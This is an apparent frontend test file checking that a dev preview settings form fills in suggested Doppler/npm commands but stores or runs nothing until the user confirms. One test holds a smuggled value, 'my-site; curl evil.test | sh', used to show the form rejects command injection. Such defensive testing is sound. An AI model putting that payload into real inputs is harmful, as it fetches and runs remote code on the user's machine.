import {
  type DevPreviewConfig,
  type DevPreviewProject,
  type Project,
  SECURE_FOUNDATION_NO_DEV_PREVIEW,
  SECURE_FOUNDATION_WORK_KEY,
  type SecureFoundationDevPreview,
  type Session,
  type Snapshot,
  secureFoundationDevPreview,
} from "@codeden/contracts";
import { fireEvent, screen, waitFor, within } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { DevPreviewProjectSettings } from "@/components/harden/dev-preview/project-settings";
import { SecureFoundationStatus } from "@/components/harden/secure-foundation/status";
import type { CodeDenClient } from "@/lib/api";
import { createMockClient } from "@/lib/api/mock";
import { renderWithClient } from "./utils";

/**
 * The dev preview of a project Secure Foundation set up: the settings form opens filled in,
 * and the same button and the same confirmation still stand between those values and anything
 * being stored.
 */
const toast = vi.hoisted(() =>
  Object.assign(vi.fn(), { success: vi.fn(), error: vi.fn(), warning: vi.fn(), loading: vi.fn() }),
);
vi.mock("sonner", () => ({ toast }));

const PROJECT = "p-site";
const project = { id: PROJECT } as Project;
const DOPPLER = "doppler run --project my-site --config dev -- npm run dev";
const withDoppler = secureFoundationDevPreview({
  secrets: "doppler",
  doppler: { project: "my-site", config: "dev" },
});
const view = (over: Partial<DevPreviewProject> = {}): DevPreviewProject => ({
  projectId: PROJECT,
  config: null,
  suggestion: {
    command: "npm run dev",
    prepareCommand: null,
    reason: "package.json has a dev script",
  },
  recommended: null,
  baseBranch: "main",
  notice: null,
  remote: false,
  ...over,
});
const stored: DevPreviewConfig = {
  command: "npm run dev",
  prepareCommand: null,
  portVars: ["PORT"],
  urlFrom: "port",
  urlPattern: null,
  pmEnabled: false,
  confirmedAt: "2026-01-05T10:00:00.000Z",
  baseBranch: "main",
};

function clientWith(
  offer: SecureFoundationDevPreview,
  api: Partial<CodeDenClient["devPreview"]> = {},
): CodeDenClient {
  const client = createMockClient();
  return {
    ...client,
    devPreview: { ...client.devPreview, project: async () => view(), ...api },
    secureFoundation: { ...client.secureFoundation, devPreview: async () => offer },
  };
}

const field = (id: string) => screen.getByTestId(id) as HTMLInputElement;
const filledIn = () => waitFor(() => expect(field("dev-preview-command").value).not.toBe(""));

describe("the dev preview settings of a Secure Foundation project", () => {
  it("open filled in, and store nothing until the person saves and confirms", async () => {
    const confirmProject = vi.fn(async () => view());
    renderWithClient(
      <DevPreviewProjectSettings project={project} />,
      clientWith(withDoppler, { confirmProject }),
    );
    await screen.findByTestId("dev-preview-settings");
    await filledIn();
    expect(field("dev-preview-command").value).toBe(DOPPLER);
    expect(field("dev-preview-prepare").value).toBe("npm ci");
    expect(field("dev-preview-port-vars").value).toBe("PORT");
    expect(
      screen.getByRole("button", { name: "From the output" }).getAttribute("aria-pressed"),
    ).toBe("true");
    // Filling the form in is all that happened.
    expect(confirmProject).not.toHaveBeenCalled();
    expect(screen.queryByTestId("dev-preview-confirm")).toBeNull();
    const notes = screen.getByTestId("secure-foundation-dev-preview-notes").textContent ?? "";
    expect(notes).toContain("Nothing is stored or run until you confirm them");
    expect(notes).toContain("npm run convex:doppler");
    expect(notes).toContain("Convex runs separately");

    // The filled form's button is enabled without an edit. It is a plain Save…: the PM thread's
    // preview is off until the person switches it on. It shows the exact commands and asks;
    // still nothing stored.
    const start = screen.getByTestId("dev-preview-save") as HTMLButtonElement;
    expect(start.textContent).toBe("Save…");
    expect(start.disabled).toBe(false);
    fireEvent.click(start);
    const dialog = await screen.findByTestId("dev-preview-confirm");
    expect(dialog.textContent).toContain("Run these commands on this computer?");
    expect(dialog.textContent).toContain(DOPPLER);
    expect(dialog.textContent).toContain("npm ci");
    expect(confirmProject).not.toHaveBeenCalled();
    // Cancelling stores nothing.
    fireEvent.click(screen.getByText("Cancel"));
    await waitFor(() => expect(screen.queryByTestId("dev-preview-confirm")).toBeNull());
    expect(confirmProject).not.toHaveBeenCalled();

    // Only "Save and allow" does, with exactly what the dialog showed.
    fireEvent.click(screen.getByTestId("dev-preview-save"));
    fireEvent.click(await screen.findByTestId("dev-preview-confirm-run"));
    await waitFor(() => expect(confirmProject).toHaveBeenCalledTimes(1));
    expect(confirmProject).toHaveBeenCalledWith(PROJECT, {
      command: DOPPLER,
      prepareCommand: "npm ci",
      portVars: ["PORT"],
      urlFrom: "output",
      urlPattern: null,
      pmEnabled: false,
    });
  });

  it("leaves what the person typed alone, and what they changed is what is confirmed", async () => {
    const confirmProject = vi.fn(async () => view());
    renderWithClient(
      <DevPreviewProjectSettings project={project} />,
      clientWith(withDoppler, { confirmProject }),
    );
    await screen.findByTestId("dev-preview-settings");
    await filledIn();
    fireEvent.change(field("dev-preview-command"), {
      target: { value: "doppler run --project my-site --config dev_personal -- npm run dev" },
    });
    // The form no longer holds the offered values: they can be put back, by the person.
    const fill = await screen.findByTestId("secure-foundation-dev-preview-fill");
    fireEvent.click(screen.getByTestId("dev-preview-save"));
    const dialog = await screen.findByTestId("dev-preview-confirm");
    expect(dialog.textContent).toContain("--config dev_personal --");
    fireEvent.click(screen.getByText("Cancel"));
    await waitFor(() => expect(screen.queryByTestId("dev-preview-confirm")).toBeNull());
    fireEvent.click(fill);
    expect(field("dev-preview-command").value).toBe(DOPPLER);
    expect(confirmProject).not.toHaveBeenCalled();
  });

  it("doesn't touch settings that are stored: filling in is a click, and saving still asks", async () => {
    const confirmProject = vi.fn(async () => view({ config: stored }));
    renderWithClient(
      <DevPreviewProjectSettings project={project} />,
      clientWith(withDoppler, { project: async () => view({ config: stored }), confirmProject }),
    );
    const fill = await screen.findByTestId("secure-foundation-dev-preview-fill");
    expect(field("dev-preview-command").value).toBe("npm run dev");
    expect(field("dev-preview-prepare").value).toBe("");
    // Stored and unchanged: nothing to save.
    expect(screen.queryByTestId("dev-preview-save")).toBeNull();

    fireEvent.click(fill);
    expect(field("dev-preview-command").value).toBe(DOPPLER);
    expect(field("dev-preview-prepare").value).toBe("npm ci");
    // The PM thread's switch is the person's own choice and stays as they left it.
    expect(screen.getByTestId("dev-preview-pm").getAttribute("aria-checked")).toBe("false");
    expect(confirmProject).not.toHaveBeenCalled();
    fireEvent.click(screen.getByTestId("dev-preview-save"));
    expect((await screen.findByTestId("dev-preview-confirm")).textContent).toContain(DOPPLER);
    expect(confirmProject).not.toHaveBeenCalled();
  });

  it("fills nothing in when a Doppler name isn't a plain name, and says why", async () => {
    const offer = secureFoundationDevPreview({
      secrets: "doppler",
      doppler: { project: "my-site; curl evil.test | sh", config: "dev" },
    });
    renderWithClient(
      <DevPreviewProjectSettings project={project} />,
      clientWith(offer, { project: async () => view({ suggestion: null }) }),
    );
    const notes = await screen.findByTestId("secure-foundation-dev-preview-notes");
    expect(notes.textContent).toContain("Nothing could be filled in for it");
    expect(notes.textContent).toContain("isn't a plain name");
    expect(notes.textContent).not.toContain("evil.test");
    expect(screen.queryByTestId("secure-foundation-dev-preview-fill")).toBeNull();
    expect(field("dev-preview-command").value).toBe("");
    expect(field("dev-preview-prepare").value).toBe("");
    expect(screen.getByTestId("dev-preview-save")).toHaveProperty("disabled", true);
  });

  it("without Doppler: the plain command, and what the person has to copy", async () => {
    const offer = secureFoundationDevPreview({ secrets: "env_local", doppler: null });
    renderWithClient(<DevPreviewProjectSettings project={project} />, clientWith(offer));
    await screen.findByTestId("dev-preview-settings");
    await filledIn();
    expect(field("dev-preview-command").value).toBe("npm run dev");
    expect(field("dev-preview-prepare").value).toBe("npm ci");
    const notes = screen.getByTestId("secure-foundation-dev-preview-notes").textContent ?? "";
    expect(notes).toContain(".env.local");
    expect(notes).toContain("The app doesn't copy it");
    expect(notes).toContain("npm run convex");
  });

  it("fills nothing in on another device, and offers nothing there", async () => {
    renderWithClient(
      <DevPreviewProjectSettings project={project} />,
      clientWith(withDoppler, { project: async () => view({ remote: true }) }),
    );
    await screen.findByTestId("secure-foundation-dev-preview-notes");
    expect(field("dev-preview-command").value).toBe("");
    expect(screen.queryByTestId("secure-foundation-dev-preview-fill")).toBeNull();
    expect(screen.queryByTestId("dev-preview-save")).toBeNull();
  });

  it("is the plain form for any other project", async () => {
    renderWithClient(
      <DevPreviewProjectSettings project={project} />,
      clientWith(SECURE_FOUNDATION_NO_DEV_PREVIEW),
    );
    await screen.findByTestId("dev-preview-suggestion");
    expect(field("dev-preview-command").value).toBe("");
    expect(screen.queryByTestId("secure-foundation-dev-preview-notes")).toBeNull();
  });
});

describe("the Secure Foundation card", () => {
  /** Without `setup` the setup session has left the snapshot (it was archived long ago). */
  async function card(
    offer: SecureFoundationDevPreview,
    config: DevPreviewConfig | null = null,
    setup = true,
  ) {
    const client = clientWith(offer, {
      project: async () => view({ config }),
      confirmProject: vi.fn(async () => view()),
    });
    const snapshot = await client.getSnapshot();
    const first = { ...(snapshot.projects[0] as Project), autonomyMode: "manual" } as Project;
    const session = {
      ...(snapshot.sessions[0] as Session),
      id: "s-setup",
      projectId: first.id,
      workKey: SECURE_FOUNDATION_WORK_KEY,
      status: "idle",
      progress: { text: "Secure Foundation: running at http://localhost:3000", at: "" },
      archivedAt: null,
    } as Session;
    const world: Snapshot = { ...snapshot, projects: [first], sessions: setup ? [session] : [] };
    renderWithClient(
      <SecureFoundationStatus projectId={first.id} />,
      {
        ...client,
        getSnapshot: async () => world,
        secureFoundation: { ...client.secureFoundation, quiet: async () => ({ quiet: true }) },
      },
      { withRouter: true },
    );
    return { client, section: await screen.findByTestId("secure-foundation-status") };
  }

  it("leads to the dev preview's settings and says that Convex runs separately", async () => {
    const { client, section } = await card(withDoppler);
    const offer = await within(section).findByTestId("secure-foundation-dev-preview");
    const link = within(offer).getByTestId("secure-foundation-dev-preview-link");
    expect(link.textContent).toBe("Set up the dev preview");
    expect(link.getAttribute("href")).toContain("tab=settings");
    expect(link.getAttribute("href")).toContain("#dev-preview");
    const convex = within(offer).getByTestId("secure-foundation-convex").textContent ?? "";
    expect(convex).toContain("Convex runs separately");
    expect(convex).toContain("npm run convex:doppler");
    expect(convex).toContain("one Convex dev deployment");
    // The card itself sets nothing up.
    expect(client.devPreview.confirmProject).not.toHaveBeenCalled();
  });

  it("points at the settings once a dev preview is set up", async () => {
    const { section } = await card(withDoppler, stored);
    const link = await within(section).findByTestId("secure-foundation-dev-preview-link");
    expect(link.textContent).toBe("Dev preview settings");
  });

  it("keeps the way to the settings after the setup session has left the snapshot", async () => {
    const { section } = await card(withDoppler, null, false);
    // The card of a quiet project without its setup session: the notice, and the link.
    await within(section).findByTestId("secure-foundation-quiet");
    const link = await within(section).findByTestId("secure-foundation-dev-preview-link");
    expect(link.textContent).toBe("Set up the dev preview");
    expect(link.getAttribute("href")).toContain("#dev-preview");
    expect(within(section).getByTestId("secure-foundation-convex").textContent).toContain(
      "npm run convex:doppler",
    );
  });

  it("shows nothing about a dev preview where none is offered", async () => {
    const { section } = await card(SECURE_FOUNDATION_NO_DEV_PREVIEW);
    // The rest of the card is there; the dev preview line is not.
    await within(section).findByTestId("secure-foundation-created");
    expect(within(section).queryByTestId("secure-foundation-dev-preview")).toBeNull();
  });
});
